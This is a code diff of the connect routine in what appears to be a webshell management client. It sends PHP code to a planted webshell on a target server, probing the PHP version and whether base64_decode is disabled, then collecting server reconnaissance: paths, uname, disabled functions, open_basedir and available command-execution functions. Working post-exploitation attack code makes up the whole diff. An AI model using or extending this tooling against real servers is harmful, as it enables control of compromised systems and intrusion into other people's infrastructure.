@@ -5,7 +5,7 @@ from urllib.parse import urlparse, unquote_plus
 
 from libs.config import alias, color, gget, gset, set_namespace
 from libs.app import value_translation
-from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template, randstr, update_prompt, get_ini_value_code
+from libs.myapp import base64_encode, is_windows, print_webshell_info, send, prepare_system_template, randstr, update_prompt, get_ini_value_code
 
 """
 url ['webshell']
@@ -124,25 +124,41 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         string=ascii_letters + digits, offset=randint(32, 62))
     version_flag_end = randstr(
         string=ascii_letters + digits, offset=randint(32, 62))
+    verify_string = randstr(ascii_letters)
+
     res = send(
-        'print("' + version_flag_start + '|".phpversion()."|' + version_flag_end + '");', raw=True)
+        """
+function magic_callback($func_name) {
+    @$r=$func_name();
+    if(empty($r)){return "Unknown";}
+    return $r;
+}
+print("%s"."|".magic_callback('phpversion')."|"."%s"."|".@base64_decode("%s"));
+""" % (version_flag_start, version_flag_end, base64_encode(verify_string)), raw=True)
     if (not res or version_flag_start not in res.r_text):
         print(color.red("Connect failed..."))
         if (res):
             print(res.r_text)
         return False
-    if ('7.' in res.r_text):
+    if ('7.' in res.r_text or "Unknown" in res.r_text):
         gset("webshell.v7", True, namespace="webshell")
+    if verify_string not in res.r_text:
+        gset("webshell.disable_base64_decode", True, namespace="webshell")
+
     if version_flag_start in res.r_text:  # 验证是否成功连接
         gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[
              1].split("|" + version_flag_end)[0], namespace="webshell")
         info_req = send(
             """
-if(!function_exists('get_ini_value')) {
-    %s
+%s
+function magic_callback($func_name) {
+    @$r=$func_name();
+    if(empty($r)){return "Unknown";}
+    return $r;
 }
+
 $bit=PHP_INT_SIZE==4?32:64;
-print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.sys_get_temp_dir().'|'.get_ini_value('disable_functions').'|'.get_ini_value('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);""".strip() % (get_ini_value_code())
+print($_SERVER['DOCUMENT_ROOT'].'|'.magic_callback('php_uname').'|'.$_SERVER['SERVER_SOFTWARE'].'|'.magic_callback('getcwd').'|'.magic_callback('sys_get_temp_dir').'|'.get_ini_value('disable_functions').'|'.get_ini_value('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);""".strip() % (get_ini_value_code())
         )
         info = info_req.r_text.strip().split("|")
         exec_func = send(get_detectd_exec_php()).r_text.strip()
@@ -190,6 +206,7 @@ print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].
              disable_function_list, namespace="webshell")
         root_path = gget("root_path")
         from_log = gget("webshell.from_log", "webshell")
+
         if not from_log:
             extra = "|".join(encoders_or_params) + \
                 "|" if encoders_or_params else ""
